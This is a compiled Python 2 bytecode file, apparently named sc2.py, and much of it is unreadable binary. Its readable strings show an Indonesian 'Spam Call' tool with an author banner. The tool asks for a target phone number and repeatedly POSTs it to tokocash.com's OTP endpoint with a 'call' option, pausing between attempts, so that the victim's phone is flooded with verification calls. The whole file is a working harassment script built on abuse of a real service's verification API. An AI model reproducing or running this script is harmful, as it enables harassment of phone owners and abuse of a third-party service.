ó
°ÊW\c           @   sT  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z e j Z e j d k s e j d k rÔ d Z	 d Z
 d Z d	 Z d
 Z e	 e
 e e e f Z e j e  Z nc e j d k sò e j d k r7d Z	 d Z
 d Z d Z d Z e	 e
 e e e f Z e j e  Z n  d   Z d   Z e   d S(   iÿÿÿÿN(   t   sleep(   t   systemt   unixt   linux2s   [31ms   [34ms   [00ms   [33ms   [36mt   wint   darwint    c           C   s   d GHd j  t t  GHd j  t t t t  GHd j  t t t t  GHd j  t t t t  GHd j  t t t t  GHd j  t t t t  GHd GHd  S(   NR   s   {} ____  {}  ____s+   {}/ ___| {} / ___|  {}| {}Author   : Kontols)   {}\___ \ {}| |      {}| {}Code     : Ulars8   {} ___) |{}| |___   {}| {}Github   : github.com/afelfgies2   {}|____/ {} \____|  {}| {}telegram : t.me/afelfgies    {}* {}Spam{}Call {}*(   t   formatt   Rt   Xt   Yt   W(    (    (    s   sc2.pyt	   Bannerinf   s    c          C   sÉ  t  d  t   y(d t t t t t t t f GHt d t d t d t d t d t d t d  }  t   i d |  d	 6d
 d 6} d } t  d  t   xu | d k  rt j d d | } d | j k rï d t t t t f GHq§ d t t t t f GHt	 d  | d } q§ Wd GHt	 d  t
 j d  Wn t k
 rVt
 j   no t k
 rpt
 j   nU t j j k
 rÄt  d  t   d j t t t t  GHd GHt	 d  t   n Xd  S(   Nt   clearsE   %s[%s?%s] %sMasukkan Nomor target Dengan awalan 08 atau 62 %s[%s?%s]
R   t   [t   +s   ] s   Nomor target s   : t   msisdnt   callt   accepti    i   s"   https://www.tokocash.com/oauth/otpt   datat   otp_attempt_lefts$   %s[%s+%s] %sOTP berhasil Dikirim ...s!   %s[%s-%s] %sOTP Gagal Dikirim ...i<   i   s   [+] Stopped...s    {}[{}-{}] {}Connection Error ...(   t   osR   R   t   BR   t	   raw_inputt   requestst   postt   textR    t   syst   exitt   EOFErrort   KeyboardInterruptt
   exceptionst   ConnectionErrorR   R
   (   t   phonet   KNTLt   countt   r(    (    s   sc2.pyt   spam#   s>    
<




(   t   threadR   R   R   t   platformt   randomt   timeR    R   R   R   R   R
   R	   t   randt   choicet   PR   R%   (    (    (    s   sc2.pyt   <module>   s,   H		
	"